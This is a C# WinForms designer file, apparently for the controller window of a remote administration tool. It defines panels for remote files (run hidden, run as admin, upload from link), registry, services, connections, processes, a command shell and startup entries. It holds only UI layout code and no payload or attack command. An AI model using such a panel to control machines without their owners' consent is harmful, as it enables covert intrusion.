        this.CountexMuneFiles = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.openToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.NormalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.HidenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.RunAsAdministratorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.refreshToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.AddArchiveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.ExtractHereToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.FilesEncrypToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.EncryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.DecryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.FolderLockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.LockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.UnlockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.UploadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.DownloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.UploadFromLinkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.RenameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.EditorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.CopyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.CutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.PasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.NewToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.FolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.EmptyFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.HideToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.ShowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.DeleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.OpenDownloadFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.PanelTitleFileManager = new System.Windows.Forms.Panel();
        this.SmailIcons = new Guna.UI2.WinForms.Guna2Button();
        this.TitleList = new Guna.UI2.WinForms.Guna2Button();
        this.ButtonPC = new Guna.UI2.WinForms.Guna2Button();
        this.FolderLen = new Bunifu.UI.WinForms.BunifuLabel();
        this.TextBox1 = new Bunifu.UI.WinForms.BunifuTextBox();
        this.SelectedItiemsL2 = new Bunifu.UI.WinForms.BunifuLabel();
        this.pr = new Bunifu.UI.WinForms.BunifuProgressBar();
        this.Search = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PageRegisrty = new System.Windows.Forms.TabPage();
        this.Panel4 = new System.Windows.Forms.Panel();
        this.tableLayoutPanel = new System.Windows.Forms.TableLayoutPanel();
        this.LogsRegistry = new Bunifu.UI.WinForms.BunifuTextBox();
        this.splitContainer = new System.Windows.Forms.SplitContainer();
        this.tvRegistryDirectory = new Server.Helper.RegistryTreeView();
        this.imageRegistryDirectoryList = new System.Windows.Forms.ImageList(this.components);
        this.lstRegistryValues = new Server.Helper.AeroListView();
        this.hName = new System.Windows.Forms.ColumnHeader();
        this.hType = new System.Windows.Forms.ColumnHeader();
        this.hValue = new System.Windows.Forms.ColumnHeader();
        this.imageRegistryKeyTypeList = new System.Windows.Forms.ImageList(this.components);
        this.menuStrip = new System.Windows.Forms.MenuStrip();
        this.editToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyBinaryDataToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyNewtoolStripSeparator = new System.Windows.Forms.ToolStripSeparator();
        this.newToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.keyToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
        this.stringValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.binaryValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.dWORD32bitValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.qWORD64bitValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.multiStringValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.expandableStringValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
        this.deleteToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.renameToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.PageServices = new System.Windows.Forms.TabPage();
        this.Panel5 = new System.Windows.Forms.Panel();
        this.ListServices = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn1 = new System.Windows.Forms.DataGridViewImageColumn();
        this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexServices = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.RefreshToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.StartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.StopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.PageConnect = new System.Windows.Forms.TabPage();
        this.Panel6 = new System.Windows.Forms.Panel();
        this.ListConnection = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn3 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexServices_1 = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.toolStripMenuItem_0 = new System.Windows.Forms.ToolStripMenuItem();
        this.KillConnect = new System.Windows.Forms.ToolStripMenuItem();
        this.PageTaskManager = new System.Windows.Forms.TabPage();
        this.Panel7 = new System.Windows.Forms.Panel();
        this.ListProcess = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn4 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn10 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn11 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.contextTaskManager = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.RefreshTaskManager = new System.Windows.Forms.ToolStripMenuItem();
        this.RestartProcess = new System.Windows.Forms.ToolStripMenuItem();
        this.KillProcess = new System.Windows.Forms.ToolStripMenuItem();
        this.PageCmd = new System.Windows.Forms.TabPage();
        this.Panel8 = new System.Windows.Forms.Panel();
        this.PowerCommand = new Guna.UI2.WinForms.Guna2GradientButton();
        this.CommandType = new Bunifu.UI.WinForms.BunifuDropdown();
        this.label1 = new System.Windows.Forms.Label();
        this.BoxCmd = new System.Windows.Forms.RichTextBox();
        this.CommandCmd = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PageStartup = new System.Windows.Forms.TabPage();
        this.Panel9 = new System.Windows.Forms.Panel();
        this.ListStartup = new Server.Helper.AeroListView();
        this.NameStartup = new System.Windows.Forms.ColumnHeader();
        this.TypeStartup = new System.Windows.Forms.ColumnHeader();
        this.ContexListStartup = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.RefreshListStartup = new System.Windows.Forms.ToolStripMenuItem();
        this.DeleteKeyStartup = new System.Windows.Forms.ToolStripMenuItem();
        this.ImageListStartup = new System.Windows.Forms.ImageList(this.components);
        this.PageDownload = new System.Windows.Forms.TabPage();
        this.Panel10 = new System.Windows.Forms.Panel();
        this.LayoutPanelDownload = new System.Windows.Forms.FlowLayoutPanel();
        this.LabelPageDownload = new Bunifu.UI.WinForms.BunifuLabel();
        this.PageLogs = new System.Windows.Forms.TabPage();
        this.Panel11 = new System.Windows.Forms.Panel();
        this.PowerPerformance = new Guna.UI2.WinForms.Guna2GradientButton();
        this.bunifuLabel4 = new Bunifu.UI.WinForms.BunifuLabel();
        this.CPU = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuPanel2 = new Bunifu.UI.WinForms.BunifuPanel();
        this.TimeSystem = new Bunifu.UI.WinForms.BunifuLabel();
        this.guna2GradientButton_0 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.label9 = new System.Windows.Forms.Label();
        this.bunifuPanel1 = new Bunifu.UI.WinForms.BunifuPanel();
        this.RAM = new Bunifu.UI.WinForms.BunifuLabel();
        this.guna2GradientButton_1 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.label8 = new System.Windows.Forms.Label();
        this.bunifuPanel11 = new Bunifu.UI.WinForms.BunifuPanel();
        this.bunifuLabel_0 = new Bunifu.UI.WinForms.BunifuLabel();
        this.guna2GradientButton_2 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.label6 = new System.Windows.Forms.Label();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.selectedItem_ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.modifyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyBinaryDataToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyToolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
        this.deleteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.renameToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.lst_ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.newToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.keyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
        this.stringValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.binaryValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.dWORD32bitValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.qWORD64bitValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.multiStringValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.expandableStringValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.tv_ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.keyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
        this.stringValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.binaryValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.dWORD32bitValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.qWORD64bitValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.multiStringValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.expandableStringValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
        this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
        this.ImageListServices = new System.Windows.Forms.ImageList(this.components);
        this.imageList_0 = new System.Windows.Forms.ImageList(this.components);
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        this.panelForm.SuspendLayout();
        this.PaneControll.SuspendLayout();
        this.PageManager.SuspendLayout();
        this.PageInfo.SuspendLayout();
        this.Panel1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListInfo).BeginInit();
        this.ContexMuneInfo.SuspendLayout();
        this.PageInstall.SuspendLayout();
        this.Panel2.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListInstalled).BeginInit();
        this.ContexMuneInstalled.SuspendLayout();
        this.PageFileManager.SuspendLayout();
        this.Panel3.SuspendLayout();
        this.PanelListFileManager.SuspendLayout();
        this.CountexMuneFiles.SuspendLayout();
        this.PanelTitleFileManager.SuspendLayout();
        this.PageRegisrty.SuspendLayout();
        this.Panel4.SuspendLayout();
        this.tableLayoutPanel.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.splitContainer).BeginInit();
        this.splitContainer.Panel1.SuspendLayout();
        this.splitContainer.Panel2.SuspendLayout();
        this.splitContainer.SuspendLayout();
        this.menuStrip.SuspendLayout();
        this.PageServices.SuspendLayout();
        this.Panel5.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListServices).BeginInit();
        this.ContexServices.SuspendLayout();
        this.PageConnect.SuspendLayout();
        this.Panel6.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListConnection).BeginInit();
        this.ContexServices_1.SuspendLayout();
        this.PageTaskManager.SuspendLayout();
        this.Panel7.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListProcess).BeginInit();
        this.contextTaskManager.SuspendLayout();
        this.PageCmd.SuspendLayout();
        this.Panel8.SuspendLayout();
        this.PageStartup.SuspendLayout();
        this.Panel9.SuspendLayout();
        this.ContexListStartup.SuspendLayout();
        this.PageDownload.SuspendLayout();
        this.Panel10.SuspendLayout();
        this.LayoutPanelDownload.SuspendLayout();
        this.PageLogs.SuspendLayout();
        this.Panel11.SuspendLayout();
        this.bunifuPanel2.SuspendLayout();
        this.bunifuPanel1.SuspendLayout();
        this.bunifuPanel11.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        this.selectedItem_ContextMenuStrip.SuspendLayout();
        this.lst_ContextMenuStrip.SuspendLayout();
        this.tv_ContextMenuStrip.SuspendLayout();
        base.SuspendLayout();
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.TitlrPage);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.bunifuLabel7);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.ButtonMaximized);
        this.PanelTitle.Location = new System.Drawing.Point(11, 20);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(800, 77);
        this.PanelTitle.TabIndex = 606;
        this.TitlrPage.AllowParentOverrides = false;
        this.TitlrPage.AutoEllipsis = false;
        this.TitlrPage.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.TitlrPage.CursorType = null;
        this.TitlrPage.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitlrPage.ForeColor = System.Drawing.Color.DarkGray;
        this.TitlrPage.Location = new System.Drawing.Point(137, 19);
        this.TitlrPage.Name = "TitlrPage";
        this.TitlrPage.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitlrPage.Size = new System.Drawing.Size(68, 15);
        this.TitlrPage.TabIndex = 606;
        this.TitlrPage.Text = "Performance";
        this.TitlrPage.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TitlrPage.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.UserIdInfo.CursorType = null;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(9, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "...";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(13, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(56, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 596;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.bunifuLabel7.AllowParentOverrides = false;
        this.bunifuLabel7.AutoEllipsis = false;
        this.bunifuLabel7.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.bunifuLabel7.CursorType = null;
        this.bunifuLabel7.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel7.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel7.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel7.Name = "bunifuLabel7";
        this.bunifuLabel7.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel7.Size = new System.Drawing.Size(54, 17);
        this.bunifuLabel7.TabIndex = 571;
        this.bunifuLabel7.Text = "Manager";
        this.bunifuLabel7.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel7.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(772, 8);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 565;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(724, 8);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 567;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(748, 8);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 566;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.FormElipse.ElipseRadius = 5;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.PaneControll);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PageManager);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(827, 630);
        this.panelForm.TabIndex = 573;
        this.panelForm.Visible = false;
        this.PaneControll.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PaneControll.Controls.Add(this.ButDownload);
        this.PaneControll.Controls.Add(this.ButCmd);
        this.PaneControll.Controls.Add(this.ButStartup);
        this.PaneControll.Controls.Add(this.ButTaskManager);
        this.PaneControll.Controls.Add(this.ButConnection);
        this.PaneControll.Controls.Add(this.ButLogs);
        this.PaneControll.Controls.Add(this.ButRegistry);
        this.PaneControll.Controls.Add(this.ButServices);
        this.PaneControll.Controls.Add(this.ButFiles);
        this.PaneControll.Controls.Add(this.ButInstalled);
        this.PaneControll.Controls.Add(this.ButInfo);
        this.PaneControll.Location = new System.Drawing.Point(15, 103);
        this.PaneControll.Name = "PaneControll";
        this.PaneControll.Size = new System.Drawing.Size(45, 517);
        this.PaneControll.TabIndex = 607;
        this.ButDownload.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButDownload.BackColor = System.Drawing.Color.Transparent;
        this.ButDownload.BorderRadius = 10;
        this.ButDownload.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButDownload.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButDownload.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButDownload.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButDownload.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButDownload.CheckedState.Parent = this.ButDownload;
        this.ButDownload.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButDownload.CustomBorderColor = System.Drawing.Color.White;
        this.ButDownload.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButDownload.CustomImages.CheckedImage");
        this.ButDownload.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButDownload.CustomImages.HoveredImage");
        this.ButDownload.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButDownload.CustomImages.Image");
        this.ButDownload.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButDownload.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButDownload.CustomImages.Parent = this.ButDownload;
        this.ButDownload.FillColor = System.Drawing.Color.White;
        this.ButDownload.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButDownload.ForeColor = System.Drawing.Color.White;
        this.ButDownload.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButDownload.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButDownload.HoverState.FillColor = System.Drawing.Color.White;
        this.ButDownload.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButDownload.HoverState.Parent = this.ButDownload;
        this.ButDownload.ImageSize = new System.Drawing.Size(27, 27);
        this.ButDownload.Location = new System.Drawing.Point(3, 418);
        this.ButDownload.Name = "ButDownload";
        this.ButDownload.PressedColor = System.Drawing.Color.White;
        this.ButDownload.ShadowDecoration.Parent = this.ButDownload;
        this.ButDownload.Size = new System.Drawing.Size(38, 38);
        this.ButDownload.TabIndex = 19;
        this.ButDownload.UseTransparentBackground = true;
        this.ButDownload.Click += new System.EventHandler(ButDownload_Click);
        this.ButCmd.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButCmd.BackColor = System.Drawing.Color.Transparent;
        this.ButCmd.BorderRadius = 10;
        this.ButCmd.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButCmd.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButCmd.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButCmd.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButCmd.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButCmd.CheckedState.Parent = this.ButCmd;
